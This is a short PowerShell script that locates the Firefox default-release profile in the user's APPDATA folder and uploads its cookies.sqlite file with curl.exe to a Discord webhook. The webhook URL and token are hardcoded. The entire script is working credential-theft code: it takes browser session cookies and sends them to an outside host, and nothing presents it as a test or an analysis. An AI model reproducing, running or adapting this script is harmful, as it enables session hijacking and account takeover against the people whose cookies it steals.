$firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
$firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}

$filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'

$webhookUrl = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"

curl.exe -F "file1=@$filePath" $webhookUrl

